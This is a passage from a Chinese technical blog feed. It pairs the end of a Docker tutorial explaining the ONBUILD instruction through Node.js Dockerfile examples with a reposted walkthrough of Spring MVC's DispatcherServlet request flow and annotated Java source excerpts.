<h2 id="ONBUILD-为他人做嫁衣裳"><a href="#ONBUILD-为他人做嫁衣裳" class="headerlink" title="ONBUILD 为他人做嫁衣裳"></a>ONBUILD 为他人做嫁衣裳</h2><p>格式：<code>ONBUILD &lt;其它指令&gt;</code>。</p>
<p>ONBUILD 是一个特殊的指令，它后面跟的是其它指令，比如 RUN, COPY 等，而这些指令，在当前镜像构建时并不会被执行。只有当以当前镜像为基础镜像，去构建下一级镜像的时候才会被执行。</p>
<p>Dockerfile 中的其它指令都是为了定制当前镜像而准备的，唯有 ONBUILD 是为了帮助别人定制自己而准备的。</p>
<p>假设我们要制作 Node.js 所写的应用的镜像。我们都知道 Node.js 使用 npm 进行包管理，所有依赖、配置、启动信息等会放到 package.json 文件里。在拿到程序代码后，需要先进行 npm install 才可以获得所有需要的依赖。然后就可以通过 npm start 来启动应用。因此，一般来说会这样写 Dockerfile：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FROM node:slim</span><br><span class="line">RUN &quot;mkdir /app&quot;</span><br><span class="line">WORKDIR /app</span><br><span class="line">COPY ./package.json /app</span><br><span class="line">RUN [ &quot;npm&quot;, &quot;install&quot; ]</span><br><span class="line">COPY . /app/</span><br><span class="line">CMD [ &quot;npm&quot;, &quot;start&quot; ]</span><br></pre></td></tr></table></figure>

<p>把这个 Dockerfile 放到 Node.js 项目的根目录，构建好镜像后，就可以直接拿来启动容器运行。但是如果我们还有第二个 Node.js 项目也差不多呢？好吧，那就再把这个 Dockerfile 复制到第二个项目里。那如果有第三个项目呢？再复制么？文件的副本越多，版本控制就越困难，让我们继续看这样的场景维护的问题。</p>
<p>如果第一个 Node.js 项目在开发过程中，发现这个 Dockerfile 里存在问题，比如敲错字了、或者需要安装额外的包，然后开发人员修复了这个 Dockerfile，再次构建，问题解决。第一个项目没问题了，但是第二个项目呢？虽然最初 Dockerfile 是复制、粘贴自第一个项目的，但是并不会因为第一个项目修复了他们的 Dockerfile，而第二个项目的 Dockerfile 就会被自动修复。</p>
<p>那么我们可不可以做一个基础镜像，然后各个项目使用这个基础镜像呢？这样基础镜像更新，各个项目不用同步 Dockerfile 的变化，重新构建后就继承了基础镜像的更新？好吧，可以，让我们看看这样的结果。那么上面的这个 Dockerfile 就会变为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FROM node:slim</span><br><span class="line">RUN &quot;mkdir /app&quot;</span><br><span class="line">WORKDIR /app</span><br><span class="line">CMD [ &quot;npm&quot;, &quot;start&quot; ]</span><br></pre></td></tr></table></figure>
<p>这里我们把项目相关的构建指令拿出来，放到子项目里去。假设这个基础镜像的名字为 my-node 的话，各个项目内的自己的 Dockerfile 就变为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FROM my-node</span><br><span class="line">COPY ./package.json /app</span><br><span class="line">RUN [ &quot;npm&quot;, &quot;install&quot; ]</span><br><span class="line">COPY . /app/</span><br></pre></td></tr></table></figure>

<p>基础镜像变化后，各个项目都用这个 Dockerfile 重新构建镜像，会继承基础镜像的更新。</p>
<p>那么，问题解决了么？没有。准确说，只解决了一半。如果这个 Dockerfile 里面有些东西需要调整呢？比如 npm install 都需要加一些参数，那怎么办？这一行 RUN 是不可能放入基础镜像的，因为涉及到了当前项目的 ./package.json，难道又要一个个修改么？所以说，这样制作基础镜像，只解决了原来的 Dockerfile 的前4条指令的变化问题，而后面三条指令的变化则完全没办法处理。</p>
<p>ONBUILD 可以解决这个问题。让我们用 ONBUILD 重新写一下基础镜像的 Dockerfile:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FROM node:slim</span><br><span class="line">RUN &quot;mkdir /app&quot;</span><br><span class="line">WORKDIR /app</span><br><span class="line">ONBUILD COPY ./package.json /app</span><br><span class="line">ONBUILD RUN [ &quot;npm&quot;, &quot;install&quot; ]</span><br><span class="line">ONBUILD COPY . /app/</span><br><span class="line">CMD [ &quot;npm&quot;, &quot;start&quot; ]</span><br></pre></td></tr></table></figure>

<p>这次我们回到原始的 Dockerfile，但是这次将项目相关的指令加上 ONBUILD，这样在构建基础镜像的时候，这三行并不会被执行。然后各个项目的 Dockerfile 就变成了简单地：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FROM my-node</span><br></pre></td></tr></table></figure>
<p>是的，只有这么一行。当在各个项目目录中，用这个只有一行的 Dockerfile 构建镜像时，之前基础镜像的那三行 ONBUILD 就会开始执行，成功的将当前项目的代码复制进镜像、并且针对本项目执行 npm install，生成应用镜像。</p>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>Docker–从入门到实践: <a href="https://yeasy.gitbooks.io/docker_practice/content/">https://yeasy.gitbooks.io/docker_practice/content/</a><br>Dockerfie 官方文档：<a href="https://docs.docker.com/engine/reference/builder/">https://docs.docker.com/engine/reference/builder/</a><br>Dockerfile 最佳实践文档：<a href="https://docs.docker.com/engine/userguide/eng-image/dockerfile_best-practices/">https://docs.docker.com/engine/userguide/eng-image/dockerfile_best-practices/</a></p>
]]></content>
      <categories>
        <category>yelog</category>
        <category>运维</category>
      </categories>
      <tags>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title>[转]SpringMVC执行流程及源码解析</title>
    <url>//SpringMVC-implementation-process</url>
    <content><![CDATA[<p>在SpringMVC中主要是围绕着DispatcherServlet来设计，可以把它当做指挥中心。这里先说明一下SpringMVC文档给出的执行流程，然后是我们稍微具体的执行流程，最后是流程大致的源码跟踪。关于很很很详细的源码解析，这里暂先不做。</p>
<h2 id="官方文档中的流程"><a href="#官方文档中的流程" class="headerlink" title="官方文档中的流程"></a>官方文档中的流程</h2><p>首先看下SpringMVC文档上给的流程图：<br><img src="http://img.saodiyang.com/DispatcherServlet.png" class="lazyload" data-srcset="http://img.saodiyang.com/DispatcherServlet.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="官方流程图"><br>这张图片给了我们大概的执行流程：</p>
<ol>
<li>用户请求首先发送到前端控制器DispatcherServlet，DispatcherServlet根据请求的信息来决定使用哪个页面控制器Controller（也就是我们通常编写的Controller）来处理该请求。找到控制器之后，DispatcherServlet将请求委托给控制器去处理。</li>
<li>接下来页面控制器开始处理用户请求，页面控制器会根据请求信息进行处理，调用业务层等等，处理完成之后，会把结果封装成一个ModelAndView返回给DispatcherServlet。</li>
<li>前端控制器DispatcherServlet接到页面控制器的返回结果后，根据返回的视图名选择相应的试图模板，并根据返回的数据进行渲染。</li>
<li>最后前端控制器DispatcherServlet将结果返回给用户。</li>
</ol>
<h2 id="更具体的流程"><a href="#更具体的流程" class="headerlink" title="更具体的流程"></a>更具体的流程</h2><p>上面只是总体流程，接下来我们稍微深入一点，看下更具体的流程，这里没有图，只有步骤解析：</p>
<ol>
<li>用户请求发送到前端控制器DispatcherServlet。</li>
<li>前端控制器DispatcherServlet接收到请求后，DispatcherServlet会使用HandlerMapping来处理，HandlerMapping会查找到具体进行处理请求的Handler对象。</li>
<li>HandlerMapping找到对应的Handler之后，并不是返回一个Handler原始对象，而是一个Handler执行链，在这个执行链中包括了拦截器和处理请求的Handler。HandlerMapping返回一个执行链给DispatcherServlet。</li>
<li>DispatcherServlet接收到执行链之后，会调用Handler适配器去执行Handler。</li>
<li>Handler适配器执行完成Handler（也就是我们写的Controller）之后会得到一个ModelAndView，并返回给DispatcherServlet。</li>
<li>DispatcherServlet接收到Handler适配器返回的ModelAndView之后，会根据其中的视图名调用视图解析器。</li>
<li>视图解析器根据逻辑视图名解析成一个真正的View视图，并返回给DispatcherServlet。</li>
<li>DispatcherServlet接收到视图之后，会根据上面的ModelAndView中的model来进行视图中数据的填充，也就是所谓的视图渲染。</li>
<li>渲染完成之后，DispatcherServlet就可以将结果返回给用户了。</li>
</ol>
<h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><p>DispatcherServlet是一个Servlet，我们知道在Servlet在处理一个请求的时候会交给service方法进行处理，这里也不例外，DispatcherServlet继承了FrameworkServlet，首先进入FrameworkServlet的service方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">service</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">	<span class="comment">//请求方法</span></span><br><span class="line">    String method = request.getMethod();</span><br><span class="line">    <span class="comment">//PATCH方法单独处理</span></span><br><span class="line">    <span class="keyword">if</span> (method.equalsIgnoreCase(RequestMethod.PATCH.name())) &#123;</span><br><span class="line">        processRequest(request, response);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;<span class="comment">//其他的请求类型的方法经由父类，也就是HttpServlet处理</span></span><br><span class="line">        <span class="keyword">super</span>.service(request, response);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>HttpServlet中会根据请求类型的不同分别调用doGet或者doPost等方法，FrameworkServlet中已经重写了这些方法，在这些方法中会调用processRequest进行处理，在processRequest中会调用doService方法，这个doService方法就是在DispatcherServlet中实现的。下面就看下DispatcherServlet中的doService方法的实现。</p>
<h3 id="请求到达DispatcherServlet"><a href="#请求到达DispatcherServlet" class="headerlink" title="请求到达DispatcherServlet"></a>请求到达DispatcherServlet</h3><p>doService方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doService</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//给request中的属性做一份快照</span></span><br><span class="line">    Map&lt;String, Object&gt; attributesSnapshot = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (WebUtils.isIncludeRequest(request)) &#123;</span><br><span class="line">        logger.debug(<span class="string">&quot;Taking snapshot of request attributes before include&quot;</span>);</span><br><span class="line">        attributesSnapshot = <span class="keyword">new</span> HashMap&lt;String, Object&gt;();</span><br><span class="line">        Enumeration&lt;?&gt; attrNames = request.getAttributeNames();</span><br><span class="line">        <span class="keyword">while</span> (attrNames.hasMoreElements()) &#123;</span><br><span class="line">            String attrName = (String) attrNames.nextElement();</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">this</span>.cleanupAfterInclude || attrName.startsWith(<span class="string">&quot;org.springframework.web.servlet&quot;</span>)) &#123;</span><br><span class="line">                attributesSnapshot.put(attrName, request.getAttribute(attrName));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//如果我们没有配置类似本地化或者主题的处理器之类的</span></span><br><span class="line">    <span class="comment">//SpringMVC会使用默认的值</span></span><br><span class="line">    <span class="comment">//默认配置文件是DispatcherServlet.properties</span></span><br><span class="line">    request.setAttribute(WEB_APPLICATION_CONTEXT_ATTRIBUTE, getWebApplicationContext());</span><br><span class="line">    request.setAttribute(LOCALE_RESOLVER_ATTRIBUTE, <span class="keyword">this</span>.localeResolver);</span><br><span class="line">    request.setAttribute(THEME_RESOLVER_ATTRIBUTE, <span class="keyword">this</span>.themeResolver);</span><br><span class="line">    request.setAttribute(THEME_SOURCE_ATTRIBUTE, getThemeSource());</span><br><span class="line"></span><br><span class="line">    FlashMap inputFlashMap = <span class="keyword">this</span>.flashMapManager.retrieveAndUpdate(request, response);</span><br><span class="line">    <span class="keyword">if</span> (inputFlashMap != <span class="keyword">null</span>) &#123;</span><br><span class="line">        request.setAttribute(INPUT_FLASH_MAP_ATTRIBUTE, Collections.unmodifiableMap(inputFlashMap));</span><br><span class="line">    &#125;</span><br><span class="line">    request.setAttribute(OUTPUT_FLASH_MAP_ATTRIBUTE, <span class="keyword">new</span> FlashMap());</span><br><span class="line">    request.setAttribute(FLASH_MAP_MANAGER_ATTRIBUTE, <span class="keyword">this</span>.flashMapManager);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">    	<span class="comment">//开始处理</span></span><br><span class="line">        doDispatch(request, response);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (WebAsyncUtils.getAsyncManager(request).isConcurrentHandlingStarted()) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// Restore the original attribute snapshot, in case of an include.</span></span><br><span class="line">        <span class="keyword">if</span> (attributesSnapshot != <span class="keyword">null</span>) &#123;</span><br><span class="line">            restoreAttributesAfterInclude(request, attributesSnapshot);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>DispatcherServlet开始真正的处理，doDispatch方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doDispatch</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    HttpServletRequest processedRequest = request;</span><br><span class="line">    HandlerExecutionChain mappedHandler = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">boolean</span> multipartRequestParsed = <span class="keyword">false</span>;</span><br><span class="line">	<span class="comment">//SpringMVC中异步请求的相关知识，暂先不解释</span></span><br><span class="line">    WebAsyncManager asyncManager = WebAsyncUtils.getAsyncManager(request);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        ModelAndView mv = <span class="keyword">null</span>;</span><br><span class="line">        Exception dispatchException = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">        	<span class="comment">//先检查是不是Multipart类型的，比如上传等</span></span><br><span class="line">            <span class="comment">//如果是Multipart类型的，则转换为MultipartHttpServletRequest类型</span></span><br><span class="line">            processedRequest = checkMultipart(request);</span><br><span class="line">            multipartRequestParsed = processedRequest != request;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//获取当前请求的Handler</span></span><br><span class="line">            mappedHandler = getHandler(processedRequest, <span class="keyword">false</span>);</span><br><span class="line">            <span class="keyword">if</span> (mappedHandler == <span class="keyword">null</span> || mappedHandler.getHandler() == <span class="keyword">null</span>) &#123;</span><br><span class="line">                noHandlerFound(processedRequest, response);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//获取当前请求的Handler适配器</span></span><br><span class="line">            HandlerAdapter ha = getHandlerAdapter(mappedHandler.getHandler());</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 对于header中last-modified的处理</span></span><br><span class="line">            String method = request.getMethod();</span><br><span class="line">            <span class="keyword">boolean</span> isGet = <span class="string">&quot;GET&quot;</span>.equals(method);</span><br><span class="line">            <span class="keyword">if</span> (isGet || <span class="string">&quot;HEAD&quot;</span>.equals(method)) &#123;</span><br><span class="line">                <span class="keyword">long</span> lastModified = ha.getLastModified(request, mappedHandler.getHandler());</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">new</span> ServletWebRequest(request, response).checkNotModified(lastModified) &amp;&amp; isGet) &#123;</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">			<span class="comment">//拦截器的preHandle方法进行处理</span></span><br><span class="line">            <span class="keyword">if</span> (!mappedHandler.applyPreHandle(processedRequest, response)) &#123;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">//真正调用Handler的地方</span></span><br><span class="line">                mv = ha.handle(processedRequest, response, mappedHandler.getHandler());</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">finally</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (asyncManager.isConcurrentHandlingStarted()) &#123;</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">			<span class="comment">//处理成默认视图名，就是添加前缀和后缀等</span></span><br><span class="line">            applyDefaultViewName(request, mv);</span><br><span class="line">            <span class="comment">//拦截器postHandle方法进行处理</span></span><br><span class="line">            mappedHandler.applyPostHandle(processedRequest, response, mv);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (Exception ex) &#123;</span><br><span class="line">            dispatchException = ex;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//处理最后的结果，渲染之类的都在这里</span></span><br><span class="line">        processDispatchResult(processedRequest, response, mappedHandler, mv, dispatchException);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (Exception ex) &#123;</span><br><span class="line">        triggerAfterCompletion(processedRequest, response, mappedHandler, ex);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (Error err) &#123;</span><br><span class="line">        triggerAfterCompletionWithError(processedRequest, response, mappedHandler, err);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (asyncManager.isConcurrentHandlingStarted()) &#123;</span><br><span class="line">            <span class="comment">// Instead of postHandle and afterCompletion</span></span><br><span class="line">            mappedHandler.applyAfterConcurrentHandlingStarted(processedRequest, response);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// Clean up any resources used by a multipart request.</span></span><br><span class="line">        <span class="keyword">if</span> (multipartRequestParsed) &#123;</span><br><span class="line">            cleanupMultipart(processedRequest);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到大概的步骤还是按照我们上面分析的走的。</p>
<h3 id="查找请求对应的Handler对象"><a href="#查找请求对应的Handler对象" class="headerlink" title="查找请求对应的Handler对象"></a>查找请求对应的Handler对象</h3><p>对应着这句代码 <code>mappedHandler = getHandler(processedRequest, false);</code>，看下具体的getHandler方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> HandlerExecutionChain <span class="title">getHandler</span><span class="params">(HttpServletRequest request, <span class="keyword">boolean</span> cache)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> getHandler(request);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>继续往下看getHandler：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> HandlerExecutionChain <span class="title">getHandler</span><span class="params">(HttpServletRequest request)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">	<span class="comment">//遍历所有的handlerMappings进行处理</span></span><br><span class="line">    <span class="comment">//handlerMappings是在启动的时候预先注册好的</span></span><br><span class="line">    <span class="keyword">for</span> (HandlerMapping hm : <span class="keyword">this</span>.handlerMappings) &#123;</span><br><span class="line">        HandlerExecutionChain handler = hm.getHandler(request);</span><br><span class="line">        <span class="keyword">if</span> (handler != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> handler;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>继续往下看getHandler，在AbstractHandlerMapping类中：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> HandlerExecutionChain <span class="title">getHandler</span><span class="params">(HttpServletRequest request)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">	<span class="comment">//根据request获取handler</span></span><br><span class="line">    Object handler = getHandlerInternal(request);</span><br><span class="line">    <span class="keyword">if</span> (handler == <span class="keyword">null</span>) &#123;</span><br><span class="line">    	<span class="comment">//如果没有找到就使用默认的handler</span></span><br><span class="line">        handler = getDefaultHandler();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (handler == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//如果Handler是String，表明是一个bean名称</span></span><br><span class="line">    <span class="comment">//需要超照对应bean</span></span><br><span class="line">    <span class="keyword">if</span> (handler <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">        String handlerName = (String) handler;</span><br><span class="line">        handler = getApplicationContext().getBean(handlerName);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//封装Handler执行链</span></span><br><span class="line">    <span class="keyword">return</span> getHandlerExecutionChain(handler, request);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="根据requrst获取handler"><a href="#根据requrst获取handler" class="headerlink" title="根据requrst获取handler"></a>根据requrst获取handler</h3><p>首先看下根据requrst获取handler步骤getHandlerInternal方法，在AbstractHandlerMethodMapping中：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> HandlerMethod <span class="title">getHandlerInternal</span><span class="params">(HttpServletRequest request)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">//获取request中的url，用来匹配handler</span></span><br><span class="line">    String lookupPath = getUrlPathHelper().getLookupPathForRequest(request);</span><br><span class="line">    <span class="comment">//根据路径寻找Handler</span></span><br><span class="line">    HandlerMethod handlerMethod = lookupHandlerMethod(lookupPath, request);</span><br><span class="line">    <span class="comment">//根据handlerMethod中的bean来实例化Handler并添加进HandlerMethod</span></span><br><span class="line">    <span class="keyword">return</span> (handlerMethod != <span class="keyword">null</span>) ? handlerMethod.createWithResolvedBean() : <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>看下根据路径寻找handler的方法lookupHandlerMethod：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> HandlerMethod <span class="title">lookupHandlerMethod</span><span class="params">(String lookupPath, HttpServletRequest request)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    List&lt;Match&gt; matches = <span class="keyword">new</span> ArrayList&lt;Match&gt;();</span><br><span class="line">	<span class="comment">//直接匹配</span></span><br><span class="line">    List&lt;T&gt; directPathMatches = <span class="keyword">this</span>.urlMap.get(lookupPath);</span><br><span class="line">    <span class="comment">//如果有匹配的，就添加进匹配列表中</span></span><br><span class="line">    <span class="keyword">if</span> (directPathMatches != <span class="keyword">null</span>) &#123;</span><br><span class="line">        addMatchingMappings(directPathMatches, matches, request);</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="comment">//还没有匹配的，就遍历所有的处理方法查找</span></span><br><span class="line">    <span class="keyword">if</span> (matches.isEmpty()) &#123;</span><br><span class="line">        <span class="comment">// No choice but to go through all mappings</span></span><br><span class="line">        addMatchingMappings(<span class="keyword">this</span>.handlerMethods.keySet(), matches, request);</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="comment">//找到了匹配的</span></span><br><span class="line">    <span class="keyword">if</span> (!matches.isEmpty()) &#123;</span><br><span class="line">        Comparator&lt;Match&gt; comparator = <span class="keyword">new</span> MatchComparator(getMappingComparator(request));</span><br><span class="line">        Collections.sort(matches, comparator);</span><br><span class="line">		<span class="comment">//排序之后，获取第一个</span></span><br><span class="line">        Match bestMatch = matches.get(<span class="number">0</span>);</span><br><span class="line">        <span class="comment">//如果有多个匹配的，会找到第二个最合适的进行比较一下</span></span><br><span class="line">        <span class="keyword">if</span> (matches.size() &gt; <span class="number">1</span>) &#123;</span><br><span class="line">            Match secondBestMatch = matches.get(<span class="number">1</span>);</span><br><span class="line">            <span class="keyword">if</span> (comparator.compare(bestMatch, secondBestMatch) == <span class="number">0</span>) &#123;</span><br><span class="line">                Method m1 = bestMatch.handlerMethod.getMethod();</span><br><span class="line">                Method m2 = secondBestMatch.handlerMethod.getMethod();</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(</span><br><span class="line">                        <span class="string">&quot;Ambiguous handler methods mapped for HTTP path &#x27;&quot;</span> + request.getRequestURL() + <span class="string">&quot;&#x27;: &#123;&quot;</span> +</span><br><span class="line">                        m1 + <span class="string">&quot;, &quot;</span> + m2 + <span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">		<span class="comment">//设置request参数</span></span><br><span class="line">        handleMatch(bestMatch.mapping, lookupPath, request);</span><br><span class="line">        <span class="comment">//返回匹配的url的处理的方法</span></span><br><span class="line">        <span class="keyword">return</span> bestMatch.handlerMethod;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;<span class="comment">//最后还没有找到，返回null</span></span><br><span class="line">        <span class="keyword">return</span> handleNoMatch(handlerMethods.keySet(), lookupPath, request);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="获取默认Handler"><a href="#获取默认Handler" class="headerlink" title="获取默认Handler"></a>获取默认Handler</h3><p>如果上面没有获取到Handler，就会获取默认的Handler。如果还获取不到就返回null。</p>
<h3 id="处理String类型的Handler"><a href="#处理String类型的Handler" class="headerlink" title="处理String类型的Handler"></a>处理String类型的Handler</h3><p>如果上面处理完的Handler是String类型的，就会根据这个handlerName获取bean。</p>
<h3 id="封装Handler执行链"><a href="#封装Handler执行链" class="headerlink" title="封装Handler执行链"></a>封装Handler执行链</h3><p>上面获取完Handler，就开始封装执行链了，就是将我们配置的拦截器加入到执行链中去，getHandlerExecutionChain：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> HandlerExecutionChain <span class="title">getHandlerExecutionChain</span><span class="params">(Object handler, HttpServletRequest request)</span> </span>&#123;</span><br><span class="line">	<span class="comment">//如果当前Handler不是执行链类型，就使用一个新的执行链实例封装起来</span></span><br><span class="line">    HandlerExecutionChain chain =</span><br><span class="line">        (handler <span class="keyword">instanceof</span> HandlerExecutionChain) ?</span><br><span class="line">            (HandlerExecutionChain) handler : <span class="keyword">new</span> HandlerExecutionChain(handler);</span><br><span class="line">	<span class="comment">//先获取适配类型的拦截器添加进去拦截器链</span></span><br><span class="line">    chain.addInterceptors(getAdaptedInterceptors());</span><br><span class="line">	<span class="comment">//当前的url</span></span><br><span class="line">    String lookupPath = urlPathHelper.getLookupPathForRequest(request);</span><br><span class="line">    <span class="comment">//遍历拦截器，找到跟当前url对应的，添加进执行链中去</span></span><br><span class="line">    <span class="keyword">for</span> (MappedInterceptor mappedInterceptor : mappedInterceptors) &#123;</span><br><span class="line">        <span class="keyword">if</span> (mappedInterceptor.matches(lookupPath, pathMatcher)) &#123;</span><br><span class="line">            chain.addInterceptor(mappedInterceptor.getInterceptor());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> chain;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="获取对应请求的Handler适配器"><a href="#获取对应请求的Handler适配器" class="headerlink" title="获取对应请求的Handler适配器"></a>获取对应请求的Handler适配器</h3><p>getHandlerAdapter：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> HandlerAdapter <span class="title">getHandlerAdapter</span><span class="params">(Object handler)</span> <span class="keyword">throws</span> ServletException </span>&#123;</span><br><span class="line">	<span class="comment">//遍历所有的HandlerAdapter，找到和当前Handler匹配的就返回</span></span><br><span class="line">    <span class="comment">//我们这里会匹配到RequestMappingHandlerAdapter</span></span><br><span class="line">    <span class="keyword">for</span> (HandlerAdapter ha : <span class="keyword">this</span>.handlerAdapters) &#123;</span><br><span class="line">        <span class="keyword">if</span> (ha.supports(handler)) &#123;</span><br><span class="line">            <span class="keyword">return</span> ha;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="缓存的处理"><a href="#缓存的处理" class="headerlink" title="缓存的处理"></a>缓存的处理</h3><p>也就是对last-modified的处理</p>
<h3 id="执行拦截器的preHandle方法"><a href="#执行拦截器的preHandle方法" class="headerlink" title="执行拦截器的preHandle方法"></a>执行拦截器的preHandle方法</h3><p>就是遍历所有的我们定义的interceptor，执行preHandle方法</p>
<h3 id="使用Handler适配器执行当前的Handler"><a href="#使用Handler适配器执行当前的Handler" class="headerlink" title="使用Handler适配器执行当前的Handler"></a>使用Handler适配器执行当前的Handler</h3><p>ha.handle执行当前Handler，我们这里使用的是RequestMappingHandlerAdapter，首先会进入AbstractHandlerMethodAdapter的handle方法：</p>
